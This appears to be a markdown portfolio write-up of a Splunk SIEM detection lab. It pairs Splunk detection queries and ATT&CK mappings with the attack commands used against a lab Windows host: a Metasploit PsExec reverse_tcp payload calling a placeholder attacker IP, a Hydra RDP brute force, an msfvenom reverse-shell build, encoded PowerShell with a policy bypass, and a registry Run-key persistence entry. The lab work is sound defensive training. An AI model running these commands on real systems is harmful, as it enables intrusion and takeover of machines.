
# ✅ **PROJECT: Enterprise SIEM Detection & Response Lab (Splunk + Windows + Kali)**

**Role:** Cybersecurity Analyst / SOC Analyst <br>
**Duration:** 2 Weeks <br>
**Tools:** Splunk Enterprise, Sysmon, Windows 11, Kali Linux, Metasploit, Hydra, Nmap<br>
**MITRE ATT&CK:** Execution, Persistence, Lateral Movement, Privilege Escalation, Credential Access

---

## **📌 Project Overview**

Designed and deployed a full **Security Information & Event Management (SIEM) detection lab** to simulate real-world cyberattacks and build actionable detection analytics. The project included configuring log sources, designing correlation searches, executing controlled attack simulations, and documenting findings according to SOC standards.

**📷 *Screenshot Placeholder:***
`![Overview Diagram](screenshot-overview.png)`

---

# ## **📁 Lab Architecture**

```text
Attacker Machine (Kali Linux)
  - Metasploit Framework
  - Hydra
  - Nmap

Windows 11 Endpoint
  - Sysmon configured (SwiftOnSecurity config)
  - RDP enabled
  - Splunk Universal Forwarder installed

Splunk Enterprise Server
  - TA-microsoft-sysmon
  - TA-Windows
  - Custom correlation searches
```

**📷 *Screenshot Placeholder:***
`![Lab Architecture](architecture-diagram.png)`

---

# ## **🎯 Objectives**

* Build a complete **blue-team SIEM lab**
* Simulate real attack techniques using Kali
* Create **Splunk detection rules** mapped to MITRE ATT&CK
* Perform analysis and generate an incident report
* Demonstrate SOC-level detection engineering skills

---

# ## **🛠️ Attack Simulations Performed**

---

## **1. PsExec Lateral Movement Simulation**

**Technique:** T1021.002 / T1569.002
**Tool:** Metasploit

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.40
set SMBUser Administrator
set SMBPass <Password>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_IP>
run
```

**Outcome:**
Generated Sysmon EventCode=1 logs showing remote execution, PsExec service creation, and network lateral movement.

**📷 *Screenshot Placeholder:***
`![PsExec Attack](psexec-output.png)`

---

## **2. RDP Brute Force Attack**

**Technique:** T1110 – Brute Force
**Tool:** Hydra

```bash
hydra -V -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.40
```

**Outcome:**
Captured multiple failed logon events (4625) followed by a successful login (4624) from the same IP.

**📷 *Screenshot Placeholder:***
`![RDP Brute Force Logs](rdp-bruteforce-splunk.png)`

---

## **3. PowerShell Obfuscation Abuse**

**Technique:** T1059.001 / T1027

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAUwBFAEMA
```

**Outcome:**
Detected hidden PowerShell execution, encoded commands, and execution policy bypass.

**📷 *Screenshot Placeholder:***
`![PowerShell Encoded Command](powershell-encoded.png)`

---

## **4. Reverse TCP Shell Execution**

**Technique:** T1105 – Ingress Tool Transfer
**Tool:** msfvenom + Metasploit handler

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o rev.exe
```

**Outcome:**
Generated Sysmon logs showing execution of an unsigned binary and outbound callback.

**📷 *Screenshot Placeholder:***
`![Reverse Shell Execution](reverse-shell-sysmon.png)`

---

## **5. Persistence via Registry Run Key**

**Technique:** T1547.001

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\evil.exe"
```

**Outcome:**
Detected Registry modification events (EventCode 13).

**📷 *Screenshot Placeholder:***
`![Registry Persistence Event](registry-persistence.png)`

---

## **6. Privilege Escalation Enumeration**

**Technique:** T1068

```powershell
whoami /priv
```

**Outcome:**
Captured privileged access checking attempts.

**📷 *Screenshot Placeholder:***
`![Privilege Enumeration Logs](privilege-enum.png)`

---

# ## **📊 Splunk Correlation Rules Developed**

Below are examples of the custom detections created:

---

### **PsExec Detection**

```spl
index=sysmon EventCode=1 
(Image="*psexec*" OR CommandLine="*psexec*")
```

**📷 *Screenshot Placeholder:***
`![PsExec Detection Query](splunk-psexec-correlation.png)`

---

### **RDP Brute Force**

```spl
index=wineventlog (EventCode=4625 OR EventCode=4624) LogonType=10
| stats count(eval(EventCode=4625)) as fails count(eval(EventCode=4624)) as success by Source_Network_Address
| where fails > 10 AND success >= 1
```

**📷 *Screenshot Placeholder:***
`![RDP Detection Query](splunk-rdp-correlation.png)`

---

### **PowerShell Abuse Detection**

```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| where like(CommandLine,"%enc%") OR like(CommandLine,"%bypass%")
```

**📷 *Screenshot Placeholder:***
`![PowerShell Detection Query](splunk-powershell-correlation.png)`

---

### **Reverse Shell Detection**

```spl
index=sysmon EventCode=1 (CommandLine="*reverse_tcp*" OR Image="*rev.exe")
```

**📷 *Screenshot Placeholder:***
`![Reverse Shell Detection Query](splunk-reverseshell-correlation.png)`

---

# ## **📘 MITRE ATT&CK Coverage**

| ATT&CK Technique | Description             |
| ---------------- | ----------------------- |
| **T1021.002**    | PsExec lateral movement |
| **T1110**        | RDP brute force         |
| **T1059.001**    | PowerShell execution    |
| **T1027**        | Command obfuscation     |
| **T1105**        | Reverse TCP payload     |
| **T1547.001**    | Registry persistence    |
| **T1068**        | Privilege escalation    |

**📷 *Screenshot Placeholder:***
`![MITRE Mapping](mitre-mapping.png)`

---

# ## **📄 Deliverables**

* Fully configured SIEM lab
* Attack simulations with logs
* 6 correlation rules
* MITRE-aligned detection strategy
* Incident response workbook
* Full documentation (this markdown)

---

# ## **📈 Impact**

* Strengthened hands-on SOC analysis skills
* Demonstrated ability to build detections from scratch
* Experience in offensive & defensive techniques
* Built a complete project suitable for job interviews

---